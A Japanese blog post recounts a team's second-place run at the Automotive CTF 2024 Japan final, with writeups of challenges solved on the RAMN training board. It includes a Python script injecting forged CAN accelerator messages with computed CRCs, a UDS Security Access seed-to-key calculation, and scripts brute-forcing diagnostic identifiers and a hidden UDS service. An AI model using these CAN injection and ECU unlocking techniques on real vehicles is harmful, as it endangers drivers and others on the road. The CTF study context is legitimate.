---
title: Automotive CTF 2024 日本決勝 - 体験記 & Writeup
id: automotive-ctf-2024-japan-final
tags:
  - CTF
  - 自動車セキュリティ
date: 2024-09-14 04:30:24
---

<img src="/img/2024/09-13/IMG_0551.jpg" alt="IMG_0551.jpg" width="auto" height="auto">

[Automotive CTF Japan](https://vicone.com/jp/automotive-ctf)の日本決勝に "TeamOne" チームとして参加し、5チーム中2位で（ギリギリ）アメリカで開催される世界大会の出場権を手に入れました🎉
（※所属とは無関係に個人活動として参加）

チームのbeaさん、hamayanhamayanさん、kusano_kさん、tkitoさん、今回もありがとうございました！

CTF強者が集まるオンサイトのCTFということで、大変思い出に残ったので体験記を書きます。自分が解いたり関わったりした問題のWriteupも書きますが、実機がないと再現できない問題ばかりなので（出場した方以外は）「へぇー」くらいにお読みください。

<!-- more -->

## 目次
<!-- toc -->

## 体験記

ベルサール六本木が会場。コンテストは9:30-16:00のそれなりの長丁場なので、補給が明暗を分けると思ってチーム全員分の甘味やおにぎりやサンドイッチを大量購入して現地インしました。現地にも大量に食物があったし弁当も出たのでめちゃくちゃ余りました💸

開場時間に合わせて到着し、問題に関する情報がないかを探ります。事前告知の通り [RAMN](https://ramn.readthedocs.io/en/latest/index.html) というボードは用意がありました。これは予選以降ドキュメントやソースコードで徹底対策していたのでスルー。
それとは別に、スルーできないドライブシミュレーターがありました。

<img src="/img/2024/09-13/PXL_20240912_233830976.jpg" alt="" width="auto" height="auto">

[CARLA](https://carla.org/) というシミュレーターに [PASTA](https://www.chip1stop.com/sp/products/toyota-pasta) というスーツケース型の自動車のコンピューターを模擬した機械が繋がっているものでした。PASTAは全然触ったことがないので、急ぎ刺さっていたBluetoothの解析・ドキュメント読み・ソースコード読みを進めました。UDSのサービスセットやCAN IDのリストを把握し、コンテスト開始前に圧倒的アドバンテージを得たと思ったのですが、開会式で「あそこのドライブシミュレーターは使いません」と司会が言って「使わんのかい！！」ってなりました。

チーム全体での顔合わせは今日初めて（一部ハードウェア問題の対策とか別のCTFイベントでお会いしてたりはした）でしたが、DiscordやZoomでそれなりに綿密に戦略会議やら勉強会やらしてきたおかげで連携は問題ないどころか老舗チームにも負けてなかったのではと思います。

コンテストが始まってチャレンジを開きます。

<img src="/img/2024/09-13/chal.png" alt="" width="600px" height="auto">

ほとんどがRAMNを使った問題。RAMN対策は分担として自分が一番できていたので、自分のPCに繋ぎます。
ログ解析が得意な人にcandumpを取って渡したり、revが得意な人がSecurity Accessのアルゴリズム解析をしてくれた後にChallenge-and-Responseを実施するオペレーターとなったりの下働きをしつつ、自身としてはUDS問題を中心にアプローチしていました。

昼前後くらいにあと1問（RAM peak）を残して割と点差を付けた1位で「勝ったなガハハ！」と思っていましたが、その1問が最後まで解き切れず、見事全問解いたieraeに逆転負けを喫しました...
コンテスト後にieraeの人に解き方を聞いて、似たアプローチはしてたけど問題タイトルからのメタ読み（peak = 頂点だから何かのメモリ領域の最大値付近の探索だな）をし過ぎていたことがわかりました。丁寧な全探索ができなかったのは猛省です。

懇親会では主催のVicOneの方や後援の企業・団体の方とおしゃべりしたり、他のチームの人ともお話できました。CANというプロトコルをベースにしてIn-Carセキュリティを担保することの難しさやら、予選問題の論評を語り合って面白かったです。
ドライブシミュレーターを運転しているときにCANバスに介入されてハンドルを勝手に操作されたりギアをR（リバース）に入れられたりして、良きデモだなぁと思いました。

会場もきれいで広く、司会はフリーアナウンサーの方が務めておられたりと、豪華な大会でした。重ね重ね、主催・後援の方々、スタッフの皆様、ありがとうございました！！！

## Writeup

フラグとかはメモってないのでだいぶ雑writeupです。

### [ECU A] slcan

> ボードのslcanバージョン番号にフラグがあります。

RAMNを繋いだUSBでシリアル通信を確立。

```bash
picocom --imap crcrlf --echo /dev/ttyACM2 -b 500000
```

バージョン番号を出すための `V` コマンド入力でフラグが出た。

### [ECU A] Takeover

> 各CANメッセージが、ブレーキ 0xF0x、アクセル 0xDDx、ステアリングホイール 0xF1x、エンジンキー 0x02、ライトスイッチ 0x01、サイドブレーキ 0x00の場合、画面の下部にフラグが表示されます。
> 
> 注意:
> 
> 末尾のxはCANメッセージの末尾4bitは無視することを意味します。
> このチャレンジではCRCとカウンターは無視されます。
> 画面に表示されるフラグ内の空白は"_"に置き換えてください。

どのCAN IDがRAMNのどの機構と対応しているのかを見出し、丁寧にRAMNをいじる問題。

SavvyCANでCAN信号を表示するところまで自分がやって、あとは隣のチームメンバーが丁寧にいじっているのをニコニコして見てたらフラグが出てた。

### [ECU B] ReadDataByIdentifier

> ECUはData Identifierの1つにフラグを保持しています。

[caringcaribou](https://github.com/CaringCaribou/caringcaribou) による全探索で瞬殺。

```bash
caringcaribou uds dump_dids 0x7e1 0x7e9
```

フラグをASCIIエンコードしたhexが表示された。今回のRAMNファームではDIDはフラグの一種類だけだった。

### [ECU A] Override

> アクセルを0xFFF以上の有効なCANメッセージに強制できれば、画面の下部にフラグが表示されます。
> 
> 注意:
> 
> 正しいCRCタイプとエンディアンを特定する必要があります。
> 画面に表示されるフラグ内の空白は"_"に置き換えてください。

「ボディECUのアクセルが出しているCANメッセージよりも速い周期で随意のアクセル開度のCANメッセージをプログラムで送れば良い」というアイディア出しと、プログラムを実行するのを担当した。
CANデータの解析やCRC特定やら含め、プログラムはチームメンバーが書いてくれた。

```python
#!/usr/bin/python3

import can
import binascii
import time
import sys

with can.Bus(interface="socketcan", channel="can0") as bus:
    accel = [0x10, 0x00, 0, 1, 2, 3, 4, 5]
    i = 0

    while True:
        accel[2] = (i & 0xFF00) >> 8
        accel[3] = i & 0xFF
        crc = binascii.crc32(bytes(accel[0:4]))
        accel[4] = crc & 0xFF
        accel[5] = (crc & 0xFF00) >> 8
        accel[6] = (crc & 0xFF0000) >> 16
        accel[7] = (crc & 0xFF000000) >> 24

        i = (i + 1) & 0xFFFF

        msg = can.Message(arbitration_id=0x010, data=accel, is_extended_id=False)
        try:
            bus.send(msg)
        except can.CanError:
            print("Send message failed")

        time.sleep(0.001)
```

これ実行したらECUのディスプレイにフラグが表示された。

### [ECU B] SecurityAccess

> ECUはData Identifier 0xFFFFにフラグを保持しています。ただし、始めに認証が必要です。

UDSのSecurity Accessの問題。添付に、Challenge-and-Responseのアルゴリズム周辺のアセンブリコード。

Security Accessのプロトコルのレクチャーと、アルゴリズムにchallengeを入力して出力のresponseをECUに渡すオペレーターの役割をした。
アルゴリズムはチームメイトが解析してこんな感じ。

```python
# `chall` がシード（チャレンジ）。キー（レスポンス）が出力される
python3 -c 'chall=0x528A2019 ; print(hex((chall*3+0x1220+20)&0xffffffff^0xffff))'
```

これでSecurity Accessが突破できた後、Read Data By Identifierサービスで `FFFF` のDIDを要求するとフラグゲット。

```bash
isotprecv -s 7e1 -d 7e9 can0

echo "22 FF FF" | isotpsend -s 7e1 -d 7e9 can0
```

### [ECU C] Secret code

> ECU Cは秘密のCANメッセージを待っています。
> 
> 注意: エンディアンに注意してください。

```bash
candump -a -t a can0  |tee candump.log
```

でcandumpログを作ってチームメイトに渡しただけ。解き方もフラグも分かってない。

### [ECU B] RAM peak

> RAMにはReadMemoryByAddressサービスで読み取れるフラグがあります。フラグの長さは17文字です。

これが最後まで解けなかった...

解けたチームの人に聞くと、RAMNのECUのSoC、[STM32L552のデータシート](https://www.st.com/resource/en/datasheet/stm32l552cc.pdf)とかに書いてあるEmbedded SRAMの有効なアドレス範囲を1バイトずつずらして開始アドレスにし、長さは17文字にしてRead Memory By Addressを要求するとフラグが出るらしい。

この全探索をサボって問題タイトル「peak」のメタ読みをして、違う開始アドレスばかり試していた。RAMNを自分のPCに繋いでいる身として、一番手を動かす機会があったはず。猛省猛省アンド猛省。

### [ECU B] UDS Backdoor

> 隠されたUDSサービスがあります。これに対して有効なリクエストをフォーマットできますか？

```bash
% caringcaribou uds services 0x7e1 0x7e9

-------------------
CARING CARIBOU v0.7 - python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0]
-------------------

Loading module 'uds'

Probing service 0xff (255/255): found 7
Done!

Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x3e: TESTER_PRESENT
Supported service 0x55: Unknown service
```

ということで、0x55が「隠されたUDSサービス」っぽい。

```bash
% echo "55 00 00" | isotpsend -s 7e1 -d 7e9 can0
```

みたいにサービスのパラメーターのバイト数を確かめていくと、全3バイトのとき以外は `incorrectMessageLengthOrInvalidFormat` のエラー。3バイトっぽい。

2バイト目のsub functionを全探索すると、 `1A` のときに限り `serviceNotSupportedInActiveSession` のエラー。

3バイト目も全探索でフラグ。最後の全探索のコードだけ手元に残ってた。

```python
import isotp
import argparse

from can_uds.comm import *
from can_uds.util import *


def solve_0x55_service(sock: isotp.socket):
    # 命令長が3バイトなのは分かっている
    # 2バイト目が 1A であることが分かっている。
    for i in range(0x00, 0xFF + 1):
        resp = send_recv(sock, bytes([0x55, 0x1A, i]))

        # resp が 7F 55 12 でなかったらprint
        if resp != bytes([0x7F, 0x55, 0x12]):
            print(f"3rd-byte: {i:02X}, resp: {resp.hex()}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("interface", help="CAN バスインターフェース名")
    args = parser.parse_args()

    source_id = 0x7E1
    dest_id = 0x7E9

    sock = create_socket(args.interface, source_id, dest_id)
    solve_0x55_service(sock)
```

### [ECU C] Noiseless

> ブレーキのCANメッセージの最下位ビットはノイズではありません。
> 
> 注意: 1分間のCANメッセージログにフラグを取得するために必要なすべてが含まれています。

```bash
candump -a -t a can0  |tee candump-accel.log
```

しつつ、RAMNのブレーキを規則的に動かす役割だけした。あとはジェバンニが一晩でやってくれました。
